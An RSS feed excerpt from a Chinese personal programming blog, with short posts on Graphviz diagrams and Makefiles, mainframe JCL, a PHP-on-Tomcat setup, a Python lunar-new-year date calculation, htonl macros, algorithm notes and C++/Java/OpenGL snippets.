<br><br><br><br><b>g2.dot</b><br><img title="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" alt="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" style="margin: 10px 10px 10px 0pt; float: left;" src="http://img624.ph.126.net/Iv7aUzlSvsFBjktgRgYfsg==/3007278651178174392.jpg" height="289" width="367">digraph G{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main [shape=box];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; parse -&gt; execute;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; init;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; cleanup;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execute -&gt; make_string;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execute -&gt; printf<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; init -&gt; make_string;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; printf;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execute -&gt; compare;<br>}<br><br></div>&nbsp;<div align="left"><img title="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" alt="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" style="margin: 10px 0pt 10px 10px; float: right;" src="http://img846.ph.126.net/LhT0iRyAubMCzY5UwpNzgQ==/2060678304500163198.jpg" height="284" width="483"><br><b>garray.dot</b><br>digraph G{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node [shape=record,height=.1];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node0[label="&lt;f0&gt; |&lt;f1&gt; G|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node1[label="&lt;f0&gt; |&lt;f1&gt; E|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node2[label="&lt;f0&gt; |&lt;f1&gt; B|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node3[label="&lt;f0&gt; |&lt;f1&gt; F|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node4[label="&lt;f0&gt; |&lt;f1&gt; R|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node5[label="&lt;f0&gt; |&lt;f1&gt; H|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node6[label="&lt;f0&gt; |&lt;f1&gt; Y|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node7[label="&lt;f0&gt; |&lt;f1&gt; A|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node8[label="&lt;f0&gt; |&lt;f1&gt; C|&lt;f2&gt;"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node0":f2 -&gt; "node4":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node0":f0 -&gt; "node1":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node1":f0 -&gt; "node2":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node1":f2 -&gt; "node3":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node2":f2 -&gt; "node8":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node2":f0 -&gt; "node7":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node4":f2 -&gt; "node6":f1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "node4":f0 -&gt; "node5":f1;<br>} <br><b>gcross.dot</b><br></div><div><img title="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" alt="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" style="margin: 10px 10px 10px 0pt; float: left;" src="http://img610.ph.126.net/KYfmMVTcQU6WTqS-COZa6w==/1686316585475137499.jpg" height="233" width="279">graph G{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; n0 -- n1 -- n2 -- n3 -- n0;<br>}<br><br><br><br><br><br><br><br><br><br><b>gos.dot </b><br></div><div><img title="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" alt="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" style="margin: 10px 0pt 10px 10px; float: right;" src="http://img610.ph.126.net/_6hgnQKPfAPkxTjA8Lp31g==/1686316585475137520.jpg" height="295" width="458"></div>&nbsp;graph G{<br><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run -- intr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; intr -- runbl;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; runbl -- run;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run -- kernel;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel -- zombie;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel -- sleep;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel -- runmem;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sleep -- swap;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; swap -- runswap;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; runswap -- new;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; runswap -- runmem;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new -- runmem;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sleep -- runmem;<br>}<br><b>gtable.dot</b><br><img title="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" alt="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" style="margin: 10px 0pt 10px 10px; float: right;" src="http://img845.ph.126.net/HZhN9F9sCW8k6bRKNTaUSg==/911697449567576553.jpg" height="127" width="219"></div>&nbsp;digraph html{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; abc [shape=none, margin=0, label=&lt;<br>&lt;TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0" CELLPADDING="4"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;TR&gt;&lt;TD ROWSPAN="3"&gt;&lt;FONT COLOR="red"&gt;hello&lt;/FONT&gt;&lt;BR/&gt;world&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TD COLSPAN="3"&gt;b&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TD ROWSPAN="3" BGCOLOR="lightgrey"&gt;g&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TD ROWSPAN="3"&gt;h&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/TR&gt;<br>&nbsp;&nbsp;&nbsp; &lt;TR&gt;&lt;TD&gt;c&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TD PORT="here"&gt;d&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TD&gt;e&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/TR&gt;<br>&nbsp;&nbsp;&nbsp; &lt;TR&gt;&lt;TD COLSPAN="3"&gt;f&lt;/TD&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/TR&gt;<br>&lt;/TABLE&gt;&gt;];<br>}<br><br>Makefile:<br>all: g1.pdf g2.pdf gtable.pdf garray.pdf gos.pdf gcross.png<br>%.pdf: %.ps<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ps2pdf $&lt;<br>%.ps: %.dot<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dot -Tps $&lt; -o $@<br>gos.ps: gos.dot<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; neato -Tps $&lt; -o $@<br>gcross.png: gcross.dot<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; neato -Tpng $&lt; -o $@<br>clean:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -rm *.pdf *.ps *.png]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201081284736746/</guid>
    </item>
    <item>
      <title>
<![CDATA[JCL执行TSO/REXX命令IKJEFT01]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007102511625195/</link>
      <description>
<![CDATA[<P>IKJEFT01可以执行TSO/REXX/CLIST命令</P>
<P>1.执行TSO命令</P>
<P>。。。</P>
<P>2.执行REXX</P>
<P>//JOBNAME1 JOB 0,'GQX',MSGCLASS=X,MSGLEVEL=(1,1), <BR>// NOTIFY=TSCGQX <BR>//STEP1 EXEC PGM=IKJEFT01,DYNAMNBR=30,REGION=4M <BR>//*****************************************************<BR>//* YOU NEED TO PUT THE DATA SET NAME ON THE SYSEXEC DD AND <BR>//* THE REXX YOUR WANT TO RUN ON THE LINE OF REXX MEMBER NAME <BR>//*****************************************************<BR>//SYSEXEC DD DSN=DS NAME THAT INCLUDE YOUR REXX,DISP=SHR <BR>//SYSTSPRT DD SYSOUT=* <BR>//SYSTSIN DD * <BR>REXX MEMBER NAME <BR>/* </P>
<P>3.包含DB2的</P>
<P>//STEP1 EXEC PGM=IKJEFT01<BR>//STEPLIB DD DISP=SHR,DSN=your.DB2.load.lib<BR>//SYSTSIN DD *<BR>DSN SYS(db2 subsystem name)<BR>RUN PROGRAM(PROG1) LIB(your.application.load.lib) PLAN(your plan name)<BR>PARM(if required)<BR>END<BR>/*</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007102511625195/</guid>
    </item>
    <item>
      <title>
<![CDATA[在Tomcat安装modoer]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720083233539734/</link>
      <description>
<![CDATA[<P>1.下载并解压缩php4.4.2到D:\software\php442，并加入到环境变量PATH中</P>  <P>2.根据php.ini-dist修改php.ini，extension_dir = "D:\software\php442\extensions" cgi.force_redirect = 0</P>  <P>3.修改Tomcat，把server/lib下的servlets-cgi.renametojar重命名为servlets-cgi.jar，修改conf/web.xml，加入</P>  <P>&nbsp;&lt;!-- hankjin php --&gt;<BR>&nbsp;&lt;servlet&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;clientInputTimeout&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;100&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;debug&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;0&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;executable&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;d:/software/php442/php.exe&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;WEB-INF/..&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/servlet&gt;</P>  <P>&nbsp;&nbsp;&nbsp; &lt;servlet-mapping&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;url-pattern&gt;*.php&lt;/url-pattern&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/servlet-mapping&gt;<BR>&nbsp;&lt;!-- end hankjin php --&gt;</P>  <P>4.修改mysql的my.ini，在max_connections=100后加入一行enable-named-pipe</P>  <P>5.创建数据库和用户</P>  <P>create database modoer; grant all privileges on modoer.* to <A rel="nofollow" href="mailto:modoer@'%'"  >modoer@'%'</A> identified by 'modoer';</P>  <P>SET PASSWORD FOR <A rel="nofollow" href="mailto:modoer@'%'=OLD_PASSWORD('modoer');flush"  >modoer@'%'=OLD_PASSWORD('modoer');flush</A> privilieges;</P>  <P>6.登录<A rel="nofollow" href="http://localhost:8080/modoer/install.php"  >http://localhost:8080/modoer/install.php</A>进行安装，数据库名用户名和密码都是modoer,地址为.</P>  <P>注意localhost和127.0.0.1都不能用，必须用.</P>  <P>7.OK<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720083233539734/</guid>
    </item>
    <item>
      <title>
<![CDATA[Python程序计算春节的阳历日期]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200911117116892/</link>
      <description>
<![CDATA[from math imp<wbr>ort sin<br>def solarTerm(year,term):<br>&nbsp;&nbsp;&nbsp; return 365.242 * year + 6.2 + 15.22 * term - 1.9 * sin(0.262 * term)<br>def lunarDay(month):<br>&nbsp;&nbsp;&nbsp; return 1.6 + 29.5306 * month + 0.4 * sin(1 - 0.45058 * month)<br>def spring(year):<br>&nbsp;&nbsp;&nbsp; '''<br>&nbsp;&nbsp;&nbsp; &gt;&gt;&gt; spring(2010)<br>&nbsp;&nbsp;&nbsp; 2010 Feb 14<br>&nbsp;&nbsp;&nbsp; '''<br>&nbsp;&nbsp;&nbsp; dongz=solarTerm(year-1900-1,23)#the last year's DongZhi<br>&nbsp;&nbsp;&nbsp; for month in range(0,(year-1900)*14):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if lunarDay(month)&gt;dongz:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; springDay=lunarDay(month+1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break<br>&nbsp;&nbsp;&nbsp; days=0<br>&nbsp;&nbsp;&nbsp; for i in range(1900,year):#total days before since 1900-1-0 to year-1-0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if i%100!=0 and i%4==0 or i%400==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; days+=366<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; days+=365<br>&nbsp;&nbsp;&nbsp; springDay-=days#spring day offset since year-1-0<br>&nbsp;&nbsp;&nbsp; if springDay &gt; 31:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "%d Feb %d" % (year,springDay-31)<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "%d Jan %d" % (year,springDay)<br>if __name__=='__main__':<br>&nbsp;&nbsp;&nbsp; imp<wbr>ort doctest<br>&nbsp;&nbsp;&nbsp; doctest.testmod()<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200911117116892/</guid>
    </item>
    <item>
      <title>
<![CDATA[htonl的实现]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201073110426970/</link>
      <description>
<![CDATA[小端CPU Linux 内核2.6.35中htonl的实现<br><br>include/linux/byteorder/generic.h Line 138<br>#define htonl(x) ___htonl(x)<br><br>include/linux/byteorder/generic.h Line 133<br>#define ___htonl(x) __cpu_to_be32(x)<br><br>include/linux/byteorder/little_endian.h Line 38<br>#define __cpu_to_be32(x) ((__force __be32)__swab32((x)))<br><br>include/linux/swab.h Line 22<br>#define ___constant_swab32(x) ((__u32)(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (((__u32)(x) &amp; (__u32)0x000000ffUL) &lt;&lt; 24) |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (((__u32)(x) &amp; (__u32)0x0000ff00UL) &lt;&lt;&nbsp; 8) |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (((__u32)(x) &amp; (__u32)0x00ff0000UL) &gt;&gt;&nbsp; 8) |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (((__u32)(x) &amp; (__u32)0xff000000UL) &gt;&gt; 24)))]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201073110426970/</guid>
    </item>
    <item>
      <title>
<![CDATA[取N个元素的前K个]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201042114519507/</link>
      <description>
<![CDATA[含N个元素的无序数组，设计取最大/最小的K个元素<br>算法1：链表<br>1. 建立一个K个元素的链表，将前K个元素加入链表，并进行排序<br>2. 对于K+1 ~ N的元素，如果小于链表的最小值，则加入链表，否则丢弃<br>3. 最终的链表内即为最终结果<br>算法复杂度：<br>用堆排序的方式，将前K个元素插入链表，时间复杂度为KlogK.<br>K+1~N的元素，使用二分法查找插入位置，时间复杂度为(N-K)logK<br>总复杂度为KlogK+(N-K)logK=NlogK.<br><br>算法2：归并<br>1. 将N个元素划分为N/(2K)组，每组2K个元素，分别计算每组的前K个<br>2. 对第一步的计算结果(N/2个元素)，重复和1相同的步骤，直到得到的结果为K个时。<br>算法复杂度：<br>第一步有N/(2K)组，每组假设用算法1的方式计算前K个，算法复杂度为2KlogK，N/(2K) x 2KlogK=NlogK<br>第二步有N/(2K)/2组，复杂度为N/(2K)/2 x 2KlogK = NlogK / 2<br>第x步的复杂度为NlogK / 2^x<br>总复杂度为NlogK(1+1/2+1/4+1/8+1/16...)=2NlogK<br><br>好像归并和链表的复杂度相同，但是有一个明显的区别：归并法很容易并行化。如果并算法2并行化，则有算法3<br>算法3：并行归并<br>第一步，将N/(2K)组数据并行计算，理想情况下各组数据同时完成计算，复杂度为2KlogK。<br>第二步，分为N/(4K)组，复杂度亦为2KlogK<br>第k步，分为N/(K2^(k-1))组<br>最后一步,分为N/(K (N/K) )组。<br>2K, 4K, 8K, 16K, ... (N/K) K，数列长度为log(N/K)=logN-logK<br>共logN步，所以复杂度为2Klog*(logN-logK)，约为KlogNlogK]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201042114519507/</guid>
    </item>
    <item>
      <title>
<![CDATA[香山营记]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720118904213799/</link>
      <description>
<![CDATA[<embed height="560px" pluginspage="http://www.adobe.com/go/getflashplayer" flashvars="mode=3&amp;pid=560242" allowfullscreen="true" allowScriptAccess="always" width="98%" invokeurls="false" src="http://st1.yxp.126.net/flash2/bookview.swf?5664966848" type="application/x-shockwave-flash" wmode="transparent"  > ]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720118904213799/</guid>
    </item>
    <item>
      <title>
<![CDATA[C++计算时间]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720101034351425/</link>
      <description>
<![CDATA[如果要比较两个算法的时间复杂度，除了理论上分析以外，计算程序的运行时间是一个很可靠的办法。<br><b>整个程序运行时间</b><br>要计算一个程序的运行时间，只要在命令前添加time命令即可<br>time ./a.out<br>就会执行a.out可执行文件，并将执行时间显示出来<br><b><br>代码段执行时间</b><br>1.使用time函数<br>time_t t1 = time(NULL);<br>time_t t2 = time(NULL);<br>cout&lt;&lt;t2-t1&lt;&lt;endl;<br>只能精确到秒<br><br>2.使用clock函数<br>clock_t t1 = clock();<br>//... operations goes here<br>clock_t t2 = clock();<br>cout&lt;&lt;t2-t1&lt;&lt;endl;<br>精确度和/usr/include/bits/time.h中的CLOCKS_PER_SEC有关<br>在Ubuntu10.04下<br>#&nbsp; define CLOCKS_PER_SEC&nbsp; 1000000l<br>理论上可以精确到微秒，但实际只能精确到10毫秒，后4位全为0<br><br>3.使用操作系统相关函数，如Linux下的ftime，Windows下的GetCurrentTime等。<br>ftime 可以精确到毫秒<br><br><b>结论</b><br>time的精确度太低，ftime 和 GetCurrentTime 平台相关。<br>clock的精确度可以接受，也是C++标准函数，推荐使用。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720101034351425/</guid>
    </item>
    <item>
      <title>
<![CDATA[A^B的后三位]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201092402415623/</link>
      <description>
<![CDATA[pow操作是一个膨胀速度极快的操作，而%操作是一个收缩极大的操作，利用它们的特性可以化简很多运算。<br>15^7=170859375，后三位是375<br>如果要求15^100，则肯定要用大数计算了。<br>但是这里要求15^100的后三位，则可以将中间过程的一些信息舍去，不用大数也能得出结果 。<br>例如<br>5 * 4 % 1000 = 20<br>(5+1000) * 4 % 1000 = 5*4%1000 + 1000*4%1000 = 20<br><b>取模定律</b><br>这里有两个关于取模运算的定律：<br>A*B % C = (A%C * B%C)%C<br>(A+B)%C = (A%C + B%C)%C<br>根据这两定律，就可以把中间结果不停地模1000，这样就不用大数运算就可以得到结果了<br>A^B%1000=A*A*A*A*A*A...%1000 = (((A*A)%1000*A)%1000*A)%1000<br>这样就得到第一个算法：<br>int x=1;<br>while(B--){<br>&nbsp;x = (x*A)%1000;<br>}<br>//注意，如果x&lt;10,则为00x,否则如果x&lt;100,则为0x，否则就是x<br>这样的算法复杂度为O(B)<br><br><b>二进制表示</b><br>B可以用二进制表示为01010010这样的格式。<br>如3=011, 5=101, 7=111<br>则3=2^0+2^1, 5=2^0+2^2, 7=2^0+2^1+2^2<br>这样就可以将A^B写作<br>A^0 * A^1 * A^2 ... A^k<br>例如B=3<br>则A^B=A^0 * 2^1<br>所以可以将上面的代码优化为为<br>int x=1,tmp=A;<br>while(B){<br>&nbsp;if(B&amp;1)<br>&nbsp;&nbsp;&nbsp; x=(x*tmp)%1000<br>&nbsp;tmp=tmp*tmp%1000; //A^(2^k)<br>&nbsp;B&gt;&gt;1;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201092402415623/</guid>
    </item>
    <item>
      <title>
<![CDATA[[转]智能加密]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010882032514/</link>
      <description>
<![CDATA[所有的加密过程都有一个预处理的过程：交换公钥或私钥，而这个交换的过程也需要加密，鸡生蛋，蛋生鸡。如何使用最少的信息完成信息交换呢？<br><br>&nbsp;&nbsp;&nbsp; 某座城市里发生了一起命案，已经确定凶手是 8 
个嫌疑犯之一。经过很多可靠的调查，城南和城北的两名警探各自独立地把嫌疑犯的名单缩减到了两个人。现在，两名警探正在通电话，他们试图对比一下彼此的调
查结果。如果他俩的嫌疑犯名单中正好只有一处重合，他们就能确定出凶手的身份了。但问题是，这座城市里有一个伸张正义、凌驾于法律之上的 XX 
侠，他正在窃听两名警探的通话。如果他从中获知了凶手的身份，他将在警方实施拘捕之前先杀死凶手。<br>&nbsp;&nbsp;&nbsp; 现在， XX 侠已经知道了那 8 个嫌疑犯是谁，但不知道两名警探各自都把目标锁定在了哪两个人上。这两名警探之前从未见过面，这通电话是他们俩第一次进行交流。他们俩能成功地确定凶手的身份，而又不让 XX 侠知道凶手是谁吗？<br>来自：http://www.matrix67.com/blog/archives/3605]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010882032514/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java中的资源的路径问题]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078784133844/</link>
      <description>
<![CDATA[<P style="TEXT-INDENT: 2em">ImageIcon imageIcon = new ImageIcon("/image/hjz.gif");</P>
<P style="TEXT-INDENT: 2em">如果打包成jar，就会发生找不到资源的错误。</P>
<P style="TEXT-INDENT: 2em">解决方案：</P>
<P style="TEXT-INDENT: 2em">ImageIcon imageIcon = new ImageIcon(getClass().getResource("/image/hjz.gif"));</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078784133844/</guid>
    </item>
    <item>
      <title>
<![CDATA[OpenGL鼠标操作：支持缩放的轨迹球]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201031471924201/</link>
      <description>
<![CDATA[从网上下载的经典OpenGL轨迹球代码，自己增加了缩放操作，共三个文件：<br>sample.cpp ArcBall.cpp ArcBall.h<br>////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br>///////////////////////////////////////////////////sample.cpp////////////////////////////////////////////////////////<br>////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br>#pragma comment( lib, "opengl32.lib" )&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>#pragma comment( lib, "glut32.lib")<br>#pragma comment( lib, "glew32.lib")&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 